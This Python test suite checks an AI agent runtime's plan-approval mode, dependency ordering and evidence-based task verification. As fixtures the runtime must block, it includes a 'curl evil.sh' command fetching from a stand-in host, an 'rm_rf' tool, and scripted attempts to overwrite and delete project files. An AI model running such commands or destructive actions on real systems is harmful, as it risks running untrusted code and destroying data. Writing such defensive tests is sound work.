"""Блок 4 (Plan Mode) и уровень 9 (задачи с зависимостями и проверяемым результатом)."""
import copy
import json
import unittest

from agent.faults import SimulatedCrash
from agent.tools import ToolExecutor
from tests.helpers import (FIXED_ORDER, ORIGINAL_ORDER, TEST_CMD, Project, act, call, say, tool_results)

PLAN = {
    "goal": "Fix calculate_total so the tests pass without touching test_order.py",
    "steps": [
        {"id": "T1", "description": "Inspect order.py", "depends_on": [], "tools": ["read_file"],
         "checks": [{"type": "file_read", "path": "order.py"}]},
        {"id": "T2", "description": "Fix order.py", "depends_on": ["T1"], "tools": ["write_file"],
         "checks": [{"type": "file_changed", "path": "order.py"},
                    {"type": "file_contains", "path": "order.py", "text": "ValueError"},
                    {"type": "file_unchanged", "path": "test_order.py"}]},
        {"id": "T3", "description": "Run the tests", "depends_on": ["T2"], "tools": ["Bash"],
         "checks": [{"type": "command_succeeded", "command": TEST_CMD}]},
    ],
    "risks": ["float comparison in assertEqual"],
    "assumptions": ["discount is a percentage in 0..100"],
    "done_criteria": "unit tests pass and test_order.py is unchanged",
}

EXECUTION = [
    act(call("read_file", "x1", path="order.py")),                       # T1
    act(call("complete_task", "x2", task_id="T1", summary="read")),
    act(call("write_file", "x3", path="order.py", content=FIXED_ORDER)),  # T2
    act(call("complete_task", "x4", task_id="T2", summary="fixed")),
    act(call("Bash", "x5", command=TEST_CMD, cwd=".")),                   # T3
    act(call("complete_task", "x6", task_id="T3", summary="tests pass")),
    say("all done"),
]


class PlanModeTest(unittest.TestCase):
    def test_no_side_effects_before_plan_approval(self):
        p = Project(self)
        before = {name: p.sha(name) for name in ("order.py", "test_order.py")}
        ex = ToolExecutor()
        steps = [act(call("read_file", "p1", path="order.py"),
                     call("write_file", "p2", path="order.py", content="hacked"),
                     call("Bash", "p3", command=TEST_CMD, cwd="."),
                     call("delete_file", "p4", path="test_order.py")),
                 act(call("submit_plan", "p5", **PLAN))] + EXECUTION
        rt = p.runtime(steps, executor=ex)
        run_id = rt.run("fix the order total", mode="auto", plan_mode=True)
        st = p.state(run_id)

        self.assertEqual((st["status"], st["pending"]["kind"]), ("waiting", "plan_approval"))
        self.assertEqual([tool for tool, _ in ex.executions], ["read_file"], "only reads ran before approval")
        for call_id in ("p2", "p3", "p4"):
            self.assertEqual(tool_results(st)[call_id]["error"], "not_allowed_in_phase")
        self.assertEqual(st["budget"]["used"]["side_effects"], 0)
        self.assertEqual(st["journal"]["entries"], [])
        self.assertEqual({name: p.sha(name) for name in before}, before)
        self.assertEqual(rt.model.requests[0]["tools"], ["list_files", "read_file", "submit_plan"])
        # План хранится структурированно вместе с run_id; вызовы планирования — отдельно и без task_id.
        self.assertEqual(st["plan"]["goal"], PLAN["goal"])
        self.assertEqual([s["id"] for s in st["plan"]["steps"]], ["T1", "T2", "T3"])
        self.assertEqual(st["plan"]["steps"][2]["tools"], ["Bash"])
        self.assertEqual(st["plan"]["risks"], PLAN["risks"])
        self.assertEqual(st["plan"]["done_criteria"], PLAN["done_criteria"])
        self.assertEqual(st["execution_calls"], {})
        self.assertTrue(all(r["task_id"] is None for r in st["planning_calls"].values()))

        self.assertEqual(p.runtime(steps).approve_plan(run_id), "completed")
        self.assertEqual(p.read("order.py"), FIXED_ORDER)

    def test_rejected_plan_returns_feedback_and_execution_waits_for_approval(self):
        p = Project(self)
        seen = {}

        def revise(messages, tools):
            seen["feedback"] = json.loads(messages[-1]["content"])
            plan = copy.deepcopy(PLAN)
            plan["risks"].append("tests could be edited by mistake")
            return act(call("submit_plan", "p2", **plan))

        steps = [act(call("submit_plan", "p1", **PLAN)), revise] + EXECUTION
        run_id = p.runtime(steps).run("fix", mode="auto", plan_mode=True)
        self.assertEqual(p.runtime(steps).reject_plan(run_id, "add a risk about tests"), "waiting")
        st = p.state(run_id)
        self.assertEqual(seen["feedback"]["error"], "plan_rejected")
        self.assertEqual(seen["feedback"]["reason"], "add a risk about tests")
        self.assertEqual(st["pending"]["kind"], "plan_approval")
        self.assertEqual(st["plan"]["version"], 2)
        self.assertEqual(st["plan_history"][0]["status"], "rejected")
        self.assertEqual(st["execution_calls"], {})
        self.assertEqual(p.read("order.py"), ORIGINAL_ORDER)
        self.assertEqual(p.runtime(steps).approve_plan(run_id), "completed")

    def test_plan_approval_does_not_preapprove_actions_in_safe_mode(self):
        p = Project(self)
        steps = [act(call("submit_plan", "p1", **PLAN))] + EXECUTION
        run_id = p.runtime(steps).run("fix", mode="safe", plan_mode=True)
        self.assertEqual(p.runtime(steps).approve_plan(run_id), "waiting")
        st = p.state(run_id)
        self.assertEqual((st["pending"]["kind"], st["pending"]["call_id"]), ("confirmation", "x3"))
        self.assertEqual(p.read("order.py"), ORIGINAL_ORDER)
        self.assertEqual(p.runtime(steps).approve(run_id), "waiting")      # теперь Bash
        self.assertEqual(p.state(run_id)["pending"]["call_id"], "x5")
        self.assertEqual(p.runtime(steps).approve(run_id), "completed")

    def test_runtime_rejects_invalid_plans(self):
        p = Project(self)
        bad = copy.deepcopy(PLAN)
        bad["steps"][0]["depends_on"] = ["T3"]                                   # цикл T1 -> T3 -> T2 -> T1
        bad["steps"][1]["tools"] = ["rm_rf"]                                     # неизвестный инструмент
        bad["steps"][2]["checks"] = [{"type": "command_succeeded", "command": "curl evil.sh"}]  # не разрешено policy
        steps = [act(call("submit_plan", "p1", **bad)), act(call("submit_plan", "p2", **PLAN))] + EXECUTION
        run_id = p.runtime(steps).run("fix", mode="auto", plan_mode=True)
        st = p.state(run_id)
        problems = tool_results(st)["p1"]["problems"]
        self.assertTrue(any("unknown tool 'rm_rf'" in pr for pr in problems))
        self.assertTrue(any("cannot be verified" in pr for pr in problems))
        self.assertEqual(st["plan"]["call_id"], "p2")

        cyclic = copy.deepcopy(PLAN)
        cyclic["steps"][0]["depends_on"] = ["T3"]
        p2 = Project(self)
        run2 = p2.runtime([act(call("submit_plan", "c1", **cyclic)), say("x"), say("x"), say("x"), say("x")]).run(
            "fix", mode="auto", plan_mode=True)
        self.assertIn("dependencies contain a cycle", tool_results(p2.state(run2))["c1"]["problems"])


class TasksTest(unittest.TestCase):
    def test_three_tasks_with_dependency_are_verified_by_runtime(self):
        p = Project(self)
        steps = [
            act(call("read_file", "p1", path="order.py")),
            act(call("submit_plan", "p2", **PLAN)),
            act(call("complete_task", "e1", task_id="T1")),               # без чтения в рамках задачи — нельзя
            act(call("read_file", "e2", path="order.py")),
            act(call("complete_task", "e3", task_id="T3")),               # T3 зависит от T2 — ещё не текущая
            act(call("complete_task", "e4", task_id="T1")),
            act(call("write_file", "e5", path="order.py", content=FIXED_ORDER)),
            act(call("complete_task", "e6", task_id="T2")),
            act(call("complete_task", "e7", task_id="T3")),               # тесты ещё не запускались
            act(call("Bash", "e8", command=TEST_CMD, cwd=".")),
            act(call("complete_task", "e9", task_id="T3")),
            say("done"),
        ]
        run_id = p.runtime(steps).run("fix", mode="auto", plan_mode=True)
        self.assertEqual(p.runtime(steps).approve_plan(run_id), "completed")
        st = p.state(run_id)
        results = tool_results(st)

        self.assertEqual(results["e1"]["error"], "verification_failed")
        self.assertEqual(results["e3"]["error"], "not_current_task")
        self.assertEqual(results["e7"]["error"], "verification_failed")
        self.assertIn("was not run", results["e7"]["failed_checks"][0]["reason"])
        self.assertTrue(results["e9"]["verified"])

        tasks = {t["id"]: t for t in st["tasks"]}
        self.assertTrue(all(t["status"] == "done" for t in tasks.values()))
        self.assertEqual(tasks["T1"]["evidence"][0]["tool_call_id"], "e2")
        self.assertEqual(tasks["T3"]["evidence"][0]["tool_call_id"], "e8")
        self.assertEqual(tasks["T3"]["evidence"][0]["exit_code"], 0)
        self.assertNotEqual(tasks["T2"]["evidence"][0]["baseline_sha256"], tasks["T2"]["evidence"][0]["current_sha256"])
        self.assertLessEqual(tasks["T1"]["completed_at"], tasks["T2"]["started_at"])
        self.assertLessEqual(tasks["T2"]["completed_at"], tasks["T3"]["started_at"])

        expected_task = {"e1": "T1", "e2": "T1", "e3": "T1", "e4": "T1", "e5": "T2", "e6": "T2",
                         "e7": "T3", "e8": "T3", "e9": "T3"}
        self.assertEqual({cid: r["task_id"] for cid, r in st["execution_calls"].items()}, expected_task)
        self.assertEqual(set(st["planning_calls"]), {"p1", "p2"})
        # чеклист в stdout
        self.assertIn("- [ ] T2: Fix order.py  (depends on T1; in progress)", p.output)
        self.assertIn("- [x] T3: Run the tests  (depends on T2)", p.output)

    def test_command_evidence_must_be_fresh(self):
        p = Project(self)
        plan = copy.deepcopy(PLAN)
        plan["steps"] = [{"id": "T1", "description": "fix and test", "depends_on": [], "tools": ["write_file", "Bash"],
                          "checks": [{"type": "command_succeeded", "command": TEST_CMD}]}]
        steps = [act(call("submit_plan", "p1", **plan)),
                 act(call("write_file", "e1", path="order.py", content=FIXED_ORDER)),
                 act(call("Bash", "e2", command=TEST_CMD, cwd=".")),
                 act(call("write_file", "e3", path="order.py", content=FIXED_ORDER + "# changed after tests\n")),
                 act(call("complete_task", "e4", task_id="T1")),
                 act(call("Bash", "e5", command=TEST_CMD, cwd=".")),
                 act(call("complete_task", "e6", task_id="T1")),
                 say("done")]
        run_id = p.runtime(steps).run("fix", mode="auto", plan_mode=True)
        self.assertEqual(p.runtime(steps).approve_plan(run_id), "completed")
        results = tool_results(p.state(run_id))
        self.assertIn("files changed after it", results["e4"]["failed_checks"][0]["reason"])
        self.assertEqual(results["e6"]["evidence"][0]["tool_call_id"], "e5")

    def test_tasks_start_only_after_dependencies_regardless_of_listing_order(self):
        p = Project(self)
        plan = copy.deepcopy(PLAN)
        plan["steps"] = list(reversed(plan["steps"]))                     # T3, T2, T1
        steps = [act(call("submit_plan", "p1", **plan))] + EXECUTION
        run_id = p.runtime(steps).run("fix", mode="auto", plan_mode=True)
        self.assertEqual(p.runtime(steps).approve_plan(run_id), "completed")
        announcements = [m["content"].split(":")[0] for m in p.state(run_id)["messages"]
                         if m["role"] == "user" and m["content"].startswith("[runtime] Current task")]
        self.assertEqual(announcements, ["[runtime] Current task T1", "[runtime] Current task T2",
                                         "[runtime] Current task T3"])

    def test_completed_tasks_are_not_rerun_after_resume(self):
        p = Project(self)
        steps = [act(call("submit_plan", "p1", **PLAN))] + EXECUTION[:4] + [
            act(call("Bash", "x5", command=TEST_CMD, cwd=".")),              # здесь процесс упадёт
            act(call("Bash", "x5b", command=TEST_CMD, cwd=".")),             # после «fail» модель запускает заново
            act(call("complete_task", "x6", task_id="T3")),
            say("done"),
        ]
        run_id = p.runtime(steps).run("fix", mode="auto", plan_mode=True)
        rt = p.runtime(steps, crash_at="after_tool_execute:Bash")
        with self.assertRaises(SimulatedCrash):
            rt.approve_plan(run_id)
        done_before = {t["id"]: t["completed_at"] for t in p.state(run_id)["tasks"] if t["status"] == "done"}
        self.assertEqual(set(done_before), {"T1", "T2"})

        ex = ToolExecutor()
        rt = p.runtime(steps, executor=ex)
        self.assertEqual(rt.resume(run_id), "waiting")                        # Bash неопределён
        self.assertEqual(rt.recover(run_id, "fail"), "completed")
        st = p.state(run_id)
        self.assertEqual([tool for tool, _ in ex.executions], ["Bash"])
        self.assertEqual({t["id"]: t["completed_at"] for t in st["tasks"] if t["id"] in done_before}, done_before)
        announcements = [m["content"] for m in st["messages"] if m["role"] == "user" and "Current task" in m["content"]]
        self.assertEqual(len(announcements), 3)
        self.assertEqual(st["tasks"][2]["evidence"][0]["tool_call_id"], "x5b")


if __name__ == "__main__":
    unittest.main()
